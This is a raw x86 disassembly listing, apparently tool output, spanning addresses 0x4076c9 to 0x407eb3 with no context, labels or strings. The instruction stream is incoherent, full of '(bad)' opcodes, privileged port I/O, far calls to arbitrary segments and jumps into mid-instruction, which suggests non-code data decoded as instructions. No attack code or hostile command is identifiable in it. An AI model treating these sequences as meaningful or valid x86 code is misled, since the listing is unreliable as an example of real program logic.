  4076c9:	cmp    dh,BYTE PTR [edx]
  4076cb:	sbb    al,0xee
  4076cd:	adc    DWORD PTR [edi],ebp
  4076cf:	lea    ebx,[ebp-0x17]
  4076d2:	gs inc esp
  4076d4:	out    dx,al
  4076d5:	cmp    eax,0x1d264597
  4076da:	jb     0x407752
  4076dc:	xlat   BYTE PTR ds:[ebx]
  4076dd:	push   esp
  4076de:	sahf   
  4076df:	dec    edi
  4076e0:	inc    edi
  4076e1:	or     eax,0x77828cc8
  4076e6:	push   ecx
  4076e8:	xor    esi,DWORD PTR [esi-0x64]
  4076eb:	adc    BYTE PTR [eax-0x63],ah
  4076ee:	sar    ebx,1
  4076f0:	rcr    BYTE PTR [ebp-0x66],cl
  4076f3:	daa    
  4076f4:	add    eax,0xf7ad8ef5
  4076f9:	xchg   esp,eax
  4076fa:	sbb    BYTE PTR [ebx-0xf],ah
  4076fd:	test   ah,ah
  4076ff:	repz cmp dh,BYTE PTR [esi+0x6c332ff4]
  407706:	test   BYTE PTR [eax+0x41f1af84],ch
  40770c:	sub    DWORD PTR [ebx-0x1328c6cb],0xfffffff7
  407713:	int3   
  407714:	jge    0x40772f
  407716:	xchg   esp,eax
  407717:	js     0x40778f
  407719:	repnz into 
  40771b:	imul   eax,DWORD PTR [ebp+0x4a8579b7],0x75
  407722:	and    ch,BYTE PTR [esi]
  407724:	rol    ebp,1
  407726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407727:	data16 test BYTE PTR [edx-0x7711fd65],0x5c
  40772f:	adc    edi,edi
  407731:	inc    esi
  407732:	ja     0x407781
  407734:	(bad)  
  407735:	push   cs
  407736:	fist   DWORD PTR [ecx+0x31]
  407739:	inc    esp
  40773a:	push   cs
  40773b:	out    0x41,al
  40773d:	sub    dh,BYTE PTR [ebx+0xb]
  407740:	jge    0x407757
  407742:	mov    DWORD PTR [ebx+ecx*2],ebx
  407745:	clc    
  407746:	cmp    BYTE PTR [esp+esi*2+0x1d],cl
  40774a:	stc    
  40774b:	pop    ds
  40774c:	(bad)  
  40774e:	fisubr WORD PTR [esi]
  407750:	pop    esi
  407751:	ds push eax
  407753:	sub    bh,dh
  407755:	ror    DWORD PTR [ebp+0x27],0xca
  407759:	xor    al,al
  40775b:	cmp    BYTE PTR [ebx-0x72],0x86
  40775f:	cmc    
  407760:	inc    edx
  407761:	push   cs
  407762:	mov    bl,0xf4
  407764:	cwde   
  407765:	hlt    
  407766:	sti    
  407767:	inc    ebx
  407768:	cbw    
  40776a:	aas    
  40776b:	or     bh,BYTE PTR [eax+0x13c42eed]
  407771:	data16 cmc 
  407773:	inc    ebp
  407774:	add    ebx,ebp
  407776:	or     eax,edx
  407778:	jg     0x407715
  40777a:	fdiv   QWORD PTR [edx-0x5aa5e410]
  407780:	push   ds
  407781:	mov    ch,0x59
  407783:	add    eax,0xc1583d09
  407788:	out    dx,eax
  407789:	xor    eax,0x15544eda
  40778e:	mov    esp,0xe38f2e64
  407793:	lahf   
  407794:	retf   
  407795:	and    dl,cl
  407797:	les    ebx,FWORD PTR [eax+0x5f]
  40779a:	(bad)  
  40779c:	pushf  
  40779d:	pop    ds
  40779e:	dec    ecx
  40779f:	mov    dl,0x4b
  4077a1:	mov    cl,dl
  4077a3:	arpl   WORD PTR [ebp-0x5c97439f],ax
  4077a9:	ins    DWORD PTR es:[edi],dx
  4077aa:	call   0xf299e3af
  4077af:	fsubr  DWORD PTR [esi]
  4077b1:	(bad)  
  4077b2:	clc    
  4077b3:	enter  0xc9ce,0x71
  4077b7:	in     eax,dx
  4077b8:	sbb    DWORD PTR [ebp+0x5d],esp
  4077bb:	fistp  DWORD PTR [ebx]
  4077be:	sub    ch,cl
  4077c0:	pop    esp
  4077c1:	int    0x81
  4077c3:	or     ah,BYTE PTR [eax+0x6]
  4077c6:	push   esi
  4077c7:	ror    ebp,0x67
  4077ca:	inc    edi
  4077cb:	and    BYTE PTR [esi-0x60],ah
  4077ce:	mov    ds:0x5708371a,eax
  4077d3:	les    esi,FWORD PTR [ecx]
  4077d5:	in     al,0x31
  4077d7:	out    0x12,eax
  4077d9:	jbe    0x4077cf
  4077db:	test   eax,0x976e3287
  4077e0:	out    0x8b,eax
  4077e2:	(bad)  
  4077e4:	mov    ss,ecx
  4077e6:	adc    eax,0x8a7cc685
  4077eb:	mov    BYTE PTR [eax],dl
  4077ed:	leave  
  4077ee:	popa   
  4077ef:	sub    esp,DWORD PTR [eax+esi*4]
  4077f2:	jo     0x407853
  4077f4:	xchg   BYTE PTR [esi],dh
  4077f6:	fcmovu st,st(6)
  4077f8:	push   esi
  4077f9:	cmp    esi,DWORD PTR [edi]
  4077fb:	fwait
  4077fc:	mov    esp,0x47392dba
  407801:	test   DWORD PTR [ebx],esp
  407803:	daa    
  407804:	and    al,BYTE PTR [ebp-0x30]
  407807:	jmp    0x228373bb
  40780c:	xor    ebp,DWORD PTR [ecx-0x11fecfd5]
  407812:	inc    ebp
  407813:	add    al,BYTE PTR [edx]
  407815:	xchg   edx,eax
  407816:	push   ebp
  407817:	js     0x4077ee
  407819:	out    dx,eax
  40781a:	cli    
  40781b:	inc    ebp
  40781c:	xchg   edi,eax
  40781d:	fnstsw WORD PTR [ebp+0x38]
  407820:	cmp    al,0x29
  407822:	cli    
  407823:	xchg   ebp,eax
  407824:	push   eax
  407825:	retf   
  407826:	(bad)  
  407827:	ss push cs
  407829:	sahf   
  40782a:	loop   0x4077fa
  40782c:	stc    
  40782d:	(bad)  
  40782e:	mov    ecx,0x8d313d97
  407833:	mov    edx,DWORD PTR [eax-0xc1efe01]
  407839:	cld    
  40783a:	jnp    0x407819
  40783c:	shl    BYTE PTR [esi+0x9],1
  40783f:	arpl   WORD PTR [ebx+0x3dbb2eef],di
  407845:	jge    0x407829
  407847:	push   esi
  407848:	cmp    dh,cl
  40784a:	cli    
  40784b:	push   ss
  40784c:	fistp  DWORD PTR [ebp+0x30706554]
  407852:	addr16 aaa 
  407854:	sbb    dh,BYTE PTR [ecx+0x3fdc4d7a]
  40785a:	call   0x2275:0x590a9a97
  407861:	add    bl,cl
  407863:	mov    gs,esp
  407865:	add    dh,al
  407867:	xor    ah,bl
  407869:	int    0xac
  40786b:	add    dl,cl
  40786d:	jle    0x4078ac
  40786f:	jb     0x407831
  407871:	shr    cl,1
  407873:	pop    eax
  407874:	loope  0x4078aa
  407876:	mov    ds:0x361e82ca,eax
  40787b:	bndldx bnd0,cs:[ebp+0x51]
  407880:	in     eax,dx
  407881:	push   ds
  407882:	push   0xf16618b
  407887:	or     DWORD PTR [edi-0x53],edi
  40788a:	dec    esp
  40788b:	mov    ebx,0xfe4168cd
  407890:	sub    dl,BYTE PTR [edi+edx*1-0x50290f14]
  407897:	dec    ecx
  407898:	das    
  407899:	lods   eax,DWORD PTR ds:[esi]
  40789a:	test   BYTE PTR [ecx+eax*1],dh
  40789d:	mov    esi,0x997d8578
  4078a2:	out    0x55,eax
  4078a4:	retf   
  4078a5:	stc    
  4078a6:	aad    0x7d
  4078a8:	repz addr16 inc ebx
  4078ab:	mov    ch,0xc0
  4078ad:	push   es
  4078ae:	mov    esp,0x1afd67f9
  4078b3:	push   eax
  4078b4:	fisubr DWORD PTR [edi]
  4078b6:	cmp    BYTE PTR [ebp+0x34],dl
  4078b9:	push   esp
  4078ba:	stos   BYTE PTR es:[edi],al
  4078bb:	mov    cl,0xf9
  4078bd:	test   eax,0x3a0c984b
  4078c2:	gs faddp st(4),st
  4078c5:	mov    DWORD PTR [eax-0x48],edx
  4078c8:	jmp    0x4078d1
  4078ca:	loop   0x40791a
  4078cc:	inc    edx
  4078cd:	xor    esp,DWORD PTR [edx]
  4078cf:	xor    eax,0xeee20be3
  4078d4:	(bad)  
  4078d6:	mov    ebp,0xd932d91a
  4078db:	lahf   
  4078dc:	xor    ebp,DWORD PTR [ecx+0x4f61a516]
  4078e2:	xor    BYTE PTR ds:[edx-0x7f6f9e04],ch
  4078e9:	(bad)  
  4078ea:	(bad)  
  4078eb:	jne    0x40793a
  4078ed:	push   eax
  4078ee:	(bad)  
  4078ef:	clc    
  4078f0:	nop
  4078f1:	or     BYTE PTR [eax],dh
  4078f3:	add    ah,BYTE PTR [eax]
  4078f5:	mov    ds:0xa626daf7,al
  4078fa:	adc    eax,0x436567f1
  4078ff:	stos   DWORD PTR es:[edi],eax
  407900:	jle    0x4078e6
  407902:	ins    BYTE PTR es:[edi],dx
  407903:	pop    ecx
  407904:	(bad)  
  407905:	fldenv [ebp-0x4f]
  407908:	cmp    al,0x16
  40790a:	out    0x6d,al
  40790c:	or     BYTE PTR [edi-0x5fe5bdd],al
  407912:	sub    DWORD PTR [eax+0x586ce7ab],edx
  407918:	add    eax,0x72b42d6e
  40791d:	adc    BYTE PTR [ebx],0xb2
  407920:	mul    bh
  407922:	lds    edx,FWORD PTR [esi-0x4e472aac]
  407928:	scas   eax,DWORD PTR es:[edi]
  407929:	inc    esi
  40792a:	cs push 0x45
  40792d:	retf   0x2b61
  407930:	and    ebx,ebx
  407932:	fadd   st(7),st
  407934:	mov    eax,ds:0x6a30b010
  407939:	and    ebx,DWORD PTR [edi]
  40793b:	pop    ss
  40793c:	inc    ebx
  40793d:	outs   dx,BYTE PTR ds:[esi]
  40793e:	cmp    al,0xb8
  407940:	push   0xd4967341
  407945:	and    dl,bh
  407947:	jnp    0x40790f
  407949:	mov    dl,0x2d
  40794b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40794c:	xchg   esp,eax
  40794d:	xor    DWORD PTR [edi-0xc678ce9],ebx
  407953:	fcomp  DWORD PTR [edx+0x5bd3453d]
  407959:	mov    esi,0xc83f8131
  40795e:	jmp    0x407977
  407960:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407961:	cs je  0x407943
  407964:	retf   0x8cd3
  407967:	fsubr  st,st(7)
  407969:	jo     0x40793f
  40796b:	xchg   ecx,eax
  40796c:	add    cl,BYTE PTR [esi-0x223b0d01]
  407972:	out    0xcf,eax
  407974:	ja     0x407906
  407976:	test   al,0x22
  407978:	mov    bh,0xb0
  40797a:	push   ss
  40797b:	shl    BYTE PTR [edx-0x4f18dae4],0xe5
  407982:	xchg   edx,eax
  407983:	add    BYTE PTR [eax],dl
  407985:	je     0x40791f
  407987:	sub    bl,dh
  407989:	inc    DWORD PTR [edx-0x61b271a5]
  40798f:	icebp  
  407990:	aam    0x81
  407992:	(bad)  
  407993:	adc    ebp,DWORD PTR [ecx-0x1d8a3675]
  407999:	or     al,0x2b
  40799b:	mov    al,ds:0xfefbbc80
  4079a0:	imul   edi,DWORD PTR [ebp-0x34a6deba],0x4bb6a033
  4079aa:	daa    
  4079ab:	xchg   ebx,eax
  4079ac:	mov    dl,0x22
  4079ae:	jnp    0x4079fb
  4079b0:	enter  0xcda,0x58
  4079b4:	jmp    0xe298:0xeeafd447
  4079bb:	ds sub ebp,ecx
  4079be:	sub    ch,ah
  4079c0:	retf   0x78a2
  4079c3:	adc    ah,cl
  4079c5:	mov    edi,0x3cdb9467
  4079ca:	adc    eax,0xc979974d
  4079cf:	or     DWORD PTR [ebx],0x27
  4079d2:	dec    edi
  4079d3:	test   ah,dh
  4079d5:	ds nop
  4079d7:	enter  0x4969,0x12
  4079db:	sbb    BYTE PTR [esi+esi*1],dl
  4079de:	nop
  4079df:	sub    BYTE PTR [ebx+0x6],ah
  4079e2:	stos   BYTE PTR es:[edi],al
  4079e3:	outs   dx,DWORD PTR ds:[esi]
  4079e4:	pusha  
  4079e5:	rcl    BYTE PTR [ebx+0x4c5145fa],1
  4079eb:	push   ss
  4079ec:	or     al,0xf7
  4079ee:	jle    0x407983
  4079f0:	dec    eax
  4079f1:	jo     0x407a41
  4079f3:	ja     0x407a72
  4079f5:	pop    esp
  4079f6:	jne    0x40798f
  4079f8:	jp     0x4079e3
  4079fa:	dec    ebp
  4079fb:	pop    esp
  4079fc:	arpl   WORD PTR [edi-0x775ef4f4],si
  407a02:	dec    DWORD PTR [edi+0x67c96e8e]
  407a08:	xor    bl,BYTE PTR [ebx-0x71]
  407a0b:	ror    BYTE PTR [edx+esi*4],0x70
  407a0f:	pusha  
  407a10:	inc    ecx
  407a11:	sub    DWORD PTR [edx-0x7f9648dc],ebx
  407a17:	retf   0x6b2
  407a1a:	sub    al,0x60
  407a1c:	jbe    0x4079cf
  407a1e:	imul   esp,DWORD PTR [ebx],0x14e00335
  407a24:	dec    edx
  407a25:	in     eax,0x3b
  407a27:	dec    ebp
  407a28:	jp     0x4079dd
  407a2a:	pop    edx
  407a2b:	pushw  cs
  407a2d:	mov    ds:0x18087e5,al
  407a32:	in     eax,dx
  407a33:	mov    dl,0x75
  407a35:	in     al,0x83
  407a37:	shl    ch,1
  407a39:	xor    al,BYTE PTR [ebx-0x4d]
  407a3c:	sti    
  407a3d:	mov    esp,0x21c50f7c
  407a42:	push   es
  407a43:	xchg   ebp,eax
  407a44:	dec    edx
  407a45:	jns    0x4079f9
  407a47:	xchg   ebp,eax
  407a48:	pop    eax
  407a49:	pop    es
  407a4a:	out    dx,eax
  407a4b:	jno    0x407a15
  407a4d:	in     al,0x79
  407a4f:	dec    ebx
  407a50:	mov    WORD PTR [edi+0x6d],ss
  407a53:	jo     0x407a59
  407a55:	push   cs
  407a56:	call   0xbb9bb4a4
  407a5b:	adc    eax,0xe1aae7bf
  407a60:	jle    0x407a62
  407a62:	xchg   edi,eax
  407a63:	cmp    eax,0xe33190cd
  407a68:	inc    ebx
  407a69:	or     dh,al
  407a6b:	rcl    BYTE PTR [ebx+0x6c4f978d],1
  407a71:	push   esp
  407a72:	mov    ebp,0xfe95f403
  407a77:	icebp  
  407a78:	out    0xc,eax
  407a7a:	icebp  
  407a7b:	aaa    
  407a7c:	fdivr  st(2),st
  407a7e:	(bad)  
  407a7f:	lock hlt 
  407a81:	sub    ah,BYTE PTR [ecx-0xc0b99a5]
  407a87:	scas   al,BYTE PTR es:[edi]
  407a88:	cmc    
  407a89:	mov    ecx,0x5b0bfabe
  407a8e:	cdq    
  407a8f:	adc    ah,BYTE PTR [esi-0x1b1dd7a5]
  407a95:	mov    ds:0x159fe9da,al
  407a9a:	pusha  
  407a9b:	and    al,0xe
  407a9d:	sub    al,0x8e
  407a9f:	or     al,dl
  407aa1:	imul   ecx,DWORD PTR [edi-0x5],0x65497bc4
  407aa8:	push   cs
  407aa9:	test   BYTE PTR [esi+0xbe5bb03],0xb3
  407ab0:	aam    0x9
  407ab2:	stos   DWORD PTR es:[edi],eax
  407ab3:	or     dl,BYTE PTR [ecx]
  407ab5:	(bad)  
  407ab6:	js     0x407a53
  407ab8:	add    eax,0x73bb44b6
  407abd:	mov    eax,0x777bc75
  407ac2:	dec    eax
  407ac3:	pusha  
  407ac4:	fs push ecx
  407ac6:	mov    ds:0x902f2eaf,eax
  407acb:	lds    esp,FWORD PTR [ebp+0x53]
  407ace:	xor    eax,0x91556679
  407ad3:	add    DWORD PTR [edi+edi*1],eax
  407ad6:	stc    
  407ad7:	ficom  WORD PTR [ecx+0x11]
  407ada:	mov    ah,0x3b
  407adc:	stos   BYTE PTR es:[edi],al
  407add:	cmp    al,0x3f
  407adf:	add    esp,eax
  407ae1:	jo     0x407b55
  407ae3:	adc    al,0xfb
  407ae5:	xchg   ebx,eax
  407ae6:	ror    BYTE PTR [eax+0x7e],cl
  407ae9:	or     BYTE PTR [ecx-0x33768edd],0x2d
  407af0:	push   ebx
  407af1:	pop    ebx
  407af2:	add    eax,0xac76517a
  407af7:	adc    eax,0x49d5a5c8
  407afc:	stos   DWORD PTR es:[edi],eax
  407afd:	imul   ebp,DWORD PTR [edx+0x2e],0x198d6ca3
  407b04:	imul   esi,ecx,0x7e
  407b07:	add    BYTE PTR [edx+0x5a64699b],0xbe
  407b0e:	inc    esi
  407b0f:	and    DWORD PTR ds:0x7df9814b,esi
  407b15:	out    dx,eax
  407b16:	mov    ebp,0x80c31b32
  407b1b:	mov    esp,0x85ff46c7
  407b20:	fsub   st(7),st
  407b22:	xlat   BYTE PTR ds:[ebx]
  407b23:	popf   
  407b24:	xor    edx,DWORD PTR [edx+0x2b9688b2]
  407b2a:	push   ebx
  407b2b:	cld    
  407b2c:	cmp    ebp,DWORD PTR [ecx]
  407b2e:	iret   
  407b2f:	scas   eax,DWORD PTR es:[edi]
  407b30:	je     0x407b57
  407b32:	xchg   esp,eax
  407b33:	ins    BYTE PTR es:[edi],dx
  407b34:	loop   0x407ae9
  407b36:	cmp    cl,al
  407b38:	arpl   bx,ax
  407b3a:	push   eax
  407b3b:	cdq    
  407b3c:	mov    edi,0x7b603e23
  407b41:	(bad)  [ebx]
  407b43:	sub    bh,ch
  407b45:	fs jnp 0x407b54
  407b48:	fs xor al,0x31
  407b4b:	call   0xf9cb:0x6426b49a
  407b52:	xor    al,0x7f
  407b54:	inc    esi
  407b55:	xlat   BYTE PTR ds:[ebx]
  407b56:	daa    
  407b57:	mov    edx,?
  407b59:	sahf   
  407b5a:	inc    esi
  407b5b:	call   DWORD PTR [eax]
  407b5d:	je     0x407bd7
  407b5f:	int    0x85
  407b61:	ins    BYTE PTR es:[edi],dx
  407b62:	mov    eax,ds:0xe751f87f
  407b67:	call   0x1d0b:0xa1f0c8d7
  407b6e:	mov    ds:0xf97e6354,al
  407b73:	jl     0x407b36
  407b75:	int    0x70
  407b77:	(bad)  
  407b78:	inc    DWORD PTR [edx-0x9]
  407b7b:	add    DWORD PTR [ebx-0x5e],ecx
  407b7e:	sub    DWORD PTR [edi-0x58937735],ecx
  407b84:	shr    BYTE PTR [ebx+0xc552b32],1
  407b8a:	out    dx,eax
  407b8b:	jge    0x407b1e
  407b8d:	loopne 0x407bf8
  407b8f:	aas    
  407b90:	xchg   ebx,eax
  407b91:	pop    ebp
  407b92:	sti    
  407b93:	xchg   esp,ebp
  407b95:	dec    esp
  407b96:	retf   
  407b97:	and    BYTE PTR [ecx],cl
  407b99:	outs   dx,BYTE PTR ds:[esi]
  407b9a:	ret    
  407b9b:	cmp    eax,0xd06226b4
  407ba0:	inc    esi
  407ba1:	push   0x8c5efe06
  407ba6:	adc    eax,0x23dc363b
  407bab:	mov    ebp,0x844c85cb
  407bb0:	jae    0x407b74
  407bb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bb3:	sbb    BYTE PTR [eax+0x6d],dh
  407bb6:	clc    
  407bb7:	call   0x1050:0x5187d615
  407bbe:	shl    BYTE PTR [edx-0x1b],1
  407bc1:	pop    ss
  407bc2:	hlt    
  407bc3:	pop    edi
  407bc4:	loop   0x407c3e
  407bc6:	jnp    0x407bf1
  407bc8:	out    dx,eax
  407bc9:	in     eax,0xa1
  407bcb:	into   
  407bcc:	push   0x4b
  407bce:	jmp    DWORD PTR [ebp-0x57]
  407bd1:	in     al,dx
  407bd2:	mov    edx,0xe38533b1
  407bd8:	daa    
  407bd9:	ins    DWORD PTR es:[edi],dx
  407bda:	pop    ebx
  407bdb:	dec    eax
  407bdc:	nop
  407bdd:	fld    DWORD PTR [edx+0x634e04ec]
  407be3:	adc    bh,BYTE PTR [edx]
  407be5:	fmulp  st(5),st
  407be7:	call   0x4174:0x2d2f406a
  407bee:	or     edi,edi
  407bf0:	mov    cl,0xf2
  407bf2:	push   esp
  407bf3:	add    ebp,edi
  407bf5:	cs jmp 0x54e28da5
  407bfb:	out    dx,eax
  407bfc:	test   al,0xa0
  407bfe:	cwde   
  407bff:	xlat   BYTE PTR ds:[ebx]
  407c00:	or     BYTE PTR [ebp-0x66],dl
  407c03:	sbb    DWORD PTR [ebp+0x55e6bd49],esi
  407c09:	(bad)  [ebx]
  407c0b:	call   DWORD PTR [edi-0x1ed01f6d]
  407c11:	icebp  
  407c12:	inc    esi
  407c13:	leave  
  407c14:	je     0x407bd5
  407c16:	call   0x4a3eef88
  407c1b:	cmc    
  407c1c:	jne    0x407c0d
  407c1e:	sbb    DWORD PTR [ebx],ecx
  407c20:	adc    dh,bl
  407c22:	dec    eax
  407c23:	iret   
  407c24:	push   cs
  407c25:	push   eax
  407c26:	in     al,dx
  407c27:	sbb    BYTE PTR [ecx+0x3a5ff63a],cl
  407c2d:	mov    ds:0x62a236f1,eax
  407c32:	(bad)  
  407c33:	scas   al,BYTE PTR es:[edi]
  407c34:	das    
  407c35:	adc    al,0x54
  407c37:	fstp   QWORD PTR [eax+0x43]
  407c3a:	mov    ch,0xbe
  407c3d:	jmp    0x407c21
  407c3f:	mov    eax,ds:0x6bf1f5f1
  407c44:	xchg   esi,eax
  407c45:	lea    ebx,[eax]
  407c47:	lahf   
  407c48:	das    
  407c49:	mov    esi,0xf4cf153
  407c4e:	mov    ebp,0xc92cd65a
  407c53:	fs pop esp
  407c55:	sbb    BYTE PTR [ecx],al
  407c57:	push   0x28
  407c59:	test   eax,0x9386604d
  407c5e:	gs inc edx
  407c60:	fisttp QWORD PTR [ebx+0x2005c952]
  407c66:	sub    edi,DWORD PTR [ecx+0x6ee9cff]
  407c6c:	mov    ah,0xc9
  407c6e:	lea    esp,[ebx]
  407c70:	fs sbb ebx,eax
  407c73:	lahf   
  407c74:	sub    al,0xf0
  407c76:	mov    BYTE PTR [edx+0x3c],al
  407c79:	imul   edx,DWORD PTR [edx],0x71
  407c7c:	daa    
  407c7d:	push   cs
  407c7e:	psubq  mm0,mm1
  407c81:	jp     0x407c06
  407c83:	fwait
  407c84:	test   DWORD PTR [ebx-0x360f9efa],esp
  407c8a:	in     eax,0xd
  407c8c:	mov    dh,ah
  407c8e:	mov    esp,0x54a73f5e
  407c93:	loopne 0x407ca0
  407c95:	inc    edx
  407c96:	retf   0xc0b6
  407c99:	out    0x88,eax
  407c9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c9c:	push   esp
  407c9d:	icebp  
  407c9e:	inc    esi
  407c9f:	cmp    eax,0x4f877b6d
  407ca4:	shr    DWORD PTR [esi+0x2e2bfe9d],cl
  407caa:	out    0x71,eax
  407cac:	and    al,0x1a
  407cae:	add    DWORD PTR [ebx],esi
  407cb0:	retf   
  407cb1:	les    ecx,FWORD PTR ds:0xbdc617c7
  407cb7:	push   ebp
  407cb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407cb9:	push   ebp
  407cba:	(bad)  
  407cbb:	in     eax,dx
  407cbc:	and    bh,ch
  407cbe:	js     0x407d23
  407cc0:	inc    eax
  407cc1:	adc    eax,0xe0363822
  407cc6:	aas    
  407cc7:	mov    WORD PTR [esi+0x19],es
  407cca:	jnp    0x407d35
  407ccc:	outs   dx,DWORD PTR ds:[esi]
  407ccd:	sbb    bl,dh
  407ccf:	mov    ebp,0xf97199f8
  407cd4:	in     eax,dx
  407cd5:	leave  
  407cd6:	es pop es
  407cd8:	aam    0xbb
  407cda:	mov    dh,0xf7
  407cdc:	sbb    bh,BYTE PTR [eax+ebx*8+0x1e]
  407ce0:	sbb    eax,0xa0057134
  407ce5:	pop    eax
  407ce6:	sti    
  407ce7:	(bad)  [edi]
  407ce9:	cmc    
  407cea:	test   DWORD PTR [ebx+0x7f0cda60],esp
  407cf0:	jns    0x407d1e
  407cf2:	in     eax,dx
  407cf3:	mov    al,BYTE PTR [edx-0x2c]
  407cf6:	xbegin 0x18963a62
  407cfc:	xchg   al,al
  407cfe:	daa    
  407cff:	xor    BYTE PTR [eax-0xfdb376],dl
  407d05:	sub    al,0x86
  407d07:	rcr    edi,0xe5
  407d0a:	xchg   edx,eax
  407d0b:	mov    dl,al
  407d0d:	dec    ebp
  407d0e:	push   0x847cbb82
  407d13:	int    0x7b
  407d15:	push   cs
  407d16:	inc    BYTE PTR [esi]
  407d18:	pop    es
  407d19:	sbb    ebp,DWORD PTR [ebx+0x4b]
  407d1c:	stos   BYTE PTR es:[edi],al
  407d1d:	jne    0x407cf6
  407d1f:	sub    al,0x5c
  407d21:	retf   
  407d22:	add    BYTE PTR [esp+eax*2-0x1b],dh
  407d26:	cmp    eax,0x70674a39
  407d2b:	xor    al,0xf3
  407d2d:	dec    esi
  407d2e:	add    al,BYTE PTR [ecx]
  407d30:	push   ss
  407d31:	ins    DWORD PTR es:[edi],dx
  407d32:	xor    eax,0xbe17c1aa
  407d37:	sub    eax,0x2e1547b9
  407d3c:	in     eax,dx
  407d3d:	or     al,0x1a
  407d3f:	mov    esp,0x4500f40
  407d44:	leave  
  407d45:	add    cl,cl
  407d47:	jo     0x407d0b
  407d49:	sbb    DWORD PTR [eax+0x44],0x6
  407d4d:	sub    al,BYTE PTR [ebx]
  407d4f:	fmul   QWORD PTR [edi]
  407d51:	push   ss
  407d52:	jae    0x407d63
  407d54:	mov    WORD PTR [esi-0x55],ds
  407d57:	dec    edi
  407d58:	xchg   esp,eax
  407d59:	mov    eax,ds:0x2873fe3d
  407d5e:	sub    ebx,0xb499b62f
  407d64:	mov    eax,ds:0x2bb4d32d
  407d69:	test   eax,0x4e8007b7
  407d6e:	enter  0xfcf2,0xd2
  407d72:	lds    edx,FWORD PTR [eax]
  407d74:	or     eax,0x2e3d108a
  407d79:	bound  ecx,QWORD PTR [ecx]
  407d7b:	mov    ebx,0xd7925270
  407d80:	mov    ds:0x1d286be7,al
  407d85:	arpl   WORD PTR [edi+0x23f3b0af],ax
  407d8b:	and    ebx,DWORD PTR [ecx-0x11]
  407d8e:	adc    eax,DWORD PTR [ecx]
  407d90:	adc    cl,BYTE PTR [ecx+0x2134894a]
  407d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d97:	add    al,0x30
  407d99:	jp     0x407d58
  407d9b:	or     eax,0x50b34159
  407da0:	int    0xc8
  407da2:	clc    
  407da3:	pop    ebx
  407da4:	lock (bad) 
  407da6:	cmc    
  407da7:	mov    WORD PTR [ebp-0x33ff569c],ss
  407dad:	cs push ss
  407daf:	pop    es
  407db0:	mov    bl,0xe9
  407db2:	cmp    eax,0xa0e3ddc3
  407db7:	scas   eax,DWORD PTR es:[edi]
  407db8:	fstp   QWORD PTR [edi]
  407dba:	or     bl,0x81
  407dbd:	xchg   BYTE PTR [edi+0x5e],dl
  407dc0:	cs lock scas eax,DWORD PTR es:[edi]
  407dc3:	jne    0x407d88
  407dc5:	in     al,0xe8
  407dc7:	inc    edi
  407dc8:	scas   eax,DWORD PTR es:[edi]
  407dc9:	dec    ebx
  407dca:	je     0x407db7
  407dcc:	jbe    0x407dee
  407dce:	retf   
  407dcf:	pop    esi
  407dd0:	sub    BYTE PTR [ecx+0x5d3f854e],dh
  407dd6:	xor    eax,0x87172f7
  407ddb:	in     al,dx
  407ddc:	lock lea esi,[ebx+0x60]
  407de0:	gs gs out dx,al
  407de3:	pop    edi
  407de4:	cmp    DWORD PTR [edi-0x63abbdf6],0x70
  407deb:	fimul  WORD PTR fs:[esi-0x76]
  407def:	in     eax,0x80
  407df1:	inc    ebp
  407df2:	dec    edi
  407df3:	pop    edx
  407df4:	mov    ebp,0xfc5360d
  407df9:	xchg   ebx,eax
  407dfa:	sbb    al,0x54
  407dfc:	leave  
  407dfd:	outs   dx,DWORD PTR ds:[esi]
  407dfe:	push   ss
  407dff:	adc    BYTE PTR [ebp+0x7a523eb0],ch
  407e05:	jecxz  0x407dc6
  407e07:	test   eax,0xb34f4462
  407e0c:	fwait
  407e0d:	mov    dh,0x93
  407e0f:	test   BYTE PTR [edx-0x7d602287],dh
  407e15:	xor    al,0x35
  407e17:	fsub   DWORD PTR [edi+ebx*2]
  407e1a:	mov    ah,BYTE PTR [eax-0x1afde551]
  407e20:	mov    ds:0x17974f69,al
  407e25:	stc    
  407e26:	fwait
  407e27:	std    
  407e28:	jge    0x407de2
  407e2a:	mov    bl,0xdc
  407e2c:	push   es
  407e2d:	ficomp DWORD PTR [ebp+0x25]
  407e30:	mov    dh,0xc7
  407e32:	mov    esi,0x486b0b92
  407e37:	loopne 0x407e37
  407e39:	(bad)  
  407e3a:	sbb    dh,BYTE PTR [esi]
  407e3c:	sub    edi,DWORD PTR [ebx+0x1004951b]
  407e42:	add    cl,ah
  407e44:	out    dx,al
  407e45:	stos   DWORD PTR es:[edi],eax
  407e46:	xchg   ecx,eax
  407e47:	lods   eax,DWORD PTR ds:[esi]
  407e48:	fmul   st(5),st
  407e4a:	mov    al,gs:0x85e266ed
  407e50:	idiv   DWORD PTR [ecx]
  407e52:	dec    esi
  407e53:	ret    0x6e29
  407e56:	call   0x1e43:0xe69e92d9
  407e5d:	jb     0x407e65
  407e5f:	in     eax,0x65
  407e61:	push   0xde1b98c8
  407e66:	mov    ebp,0x3af3bbb6
  407e6b:	enter  0x5479,0xe2
  407e6f:	mov    DWORD PTR [esi],esi
  407e71:	pop    ebx
  407e72:	push   edx
  407e73:	push   esp
  407e74:	inc    DWORD PTR [ecx]
  407e76:	or     eax,0xd7bdbbe7
  407e7b:	add    esi,DWORD PTR [edx+0x2a335db5]
  407e81:	mov    DWORD PTR [ebp+0x36],ebx
  407e84:	outs   dx,BYTE PTR ds:[esi]
  407e85:	nop
  407e86:	adc    DWORD PTR [ebx],esp
  407e88:	(bad)  
  407e89:	pop    ecx
  407e8a:	xor    DWORD PTR [esi+0x33ff3822],eax
  407e90:	pop    ds
  407e91:	loop   0x407e94
  407e93:	pop    ebx
  407e94:	dec    ebx
  407e95:	cmp    DWORD PTR [edi-0x44],esp
  407e98:	shl    DWORD PTR [esp+ebp*1],0xcf
  407e9c:	mov    al,BYTE PTR [esi]
  407e9e:	mov    ah,0x7b
  407ea0:	int    0x5c
  407ea2:	push   edx
  407ea3:	adc    ah,cl
  407ea5:	scas   eax,DWORD PTR es:[edi]
  407ea6:	rol    DWORD PTR [ebp-0x27fb3f35],0xa
  407ead:	aam    0xb9
  407eaf:	cdq    
  407eb0:	dec    esi
  407eb1:	out    0x90,al
  407eb3:	aaa    
